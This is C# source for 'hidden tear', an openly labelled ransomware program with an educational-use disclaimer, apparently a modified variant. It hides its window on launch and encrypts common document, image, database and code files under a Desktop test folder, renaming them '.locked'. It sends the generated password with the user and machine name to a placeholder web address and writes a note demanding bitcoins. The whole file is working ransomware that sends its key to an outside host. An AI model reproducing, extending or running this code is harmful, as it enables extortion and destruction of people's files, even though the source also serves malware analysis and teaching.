/*
 _     _     _     _              _                  
| |   (_)   | |   | |            | |                 
| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
| '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
 
 * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
 * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
 * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
 * 
 * Ve durdu saatler 
 * Susuyor seni zaman
 * Sesin dondu kulagimda
 * Dedi uykudan uyan
 * 
 * Yine boyle bir aksamdi
 * Sen guluyordun ya gozlerimin icine
 * Feslegenler boy vermisti
 * Gokten parlak bir yildiz dustu pesine
 * Sakladim gozyaslarimi
 */

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace hidden_tear
{
    public partial class Form1 : Form
    {
        // URL to send encryption password and computer info
        string targetURL = "https://www.example.com/hidden-tear/write.php?info=";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            startAction();
        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        // AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return encryptedBytes;
        }

        // Creates random password for encryption
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            byte[] randomBytes = new byte[length];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(randomBytes);
            }
            for (int i = 0; i < length; i++)
            {
                res.Append(valid[randomBytes[i] % valid.Length]);
            }
            return res.ToString();
        }

        // Sends created password to target location
        public void SendPassword(string password)
        {
            string info = computerName + "-" + userName + " " + password;
            var fullUrl = targetURL + info;
            try
            {
                var content = new WebClient().DownloadString(fullUrl);
            }
            catch (WebException ex)
            {
                Console.WriteLine("Failed to send password: " + ex.Message);
                try
                {
                    File.AppendAllText("log.txt", $"Password: {info}\n");
                }
                catch (Exception logEx)
                {
                    Console.WriteLine($"Failed to log password: {logEx.Message}");
                }
            }
        }

        // Encrypts single file
        public void EncryptFile(string file, string password)
        {
            try
            {
                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
                using (var sha256 = SHA256.Create())
                {
                    passwordBytes = sha256.ComputeHash(passwordBytes);
                }
                byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
                string tempFile = file + ".tmp";
                File.WriteAllBytes(tempFile, bytesEncrypted);
                File.Move(tempFile, file + ".locked");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to encrypt {file}: {ex.Message}");
            }
        }

        // Encrypts target directory
        public void encryptDirectory(string location, string password)
        {
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
            };
            try
            {
                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]).ToLower();
                    if (validExtensions.Contains(extension, StringComparer.OrdinalIgnoreCase))
                    {
                        EncryptFile(files[i], password);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    encryptDirectory(childDirectories[i], password);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to process directory {location}: {ex.Message}");
            }
        }

        public void startAction()
        {
            string password = CreatePassword(15);
            string path = "\\Desktop\\test";
            string startPath = userDir + userName + path;
            if (Directory.Exists(startPath))
            {
                SendPassword(password);
                encryptDirectory(startPath, password);
                messageCreator();
            }
            else
            {
                Console.WriteLine("Directory not found: " + startPath);
            }
            password = null;
            System.Windows.Forms.Application.Exit();
        }

        public void messageCreator()
        {
            string path = "\\Desktop\\test\\READ_IT.txt";
            string fullpath = userDir + userName + path;
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(fullpath));
                string[] lines = { "Files have been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
                File.WriteAllLines(fullpath, lines);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to create message: {ex.Message}");
            }
        }
    }
}
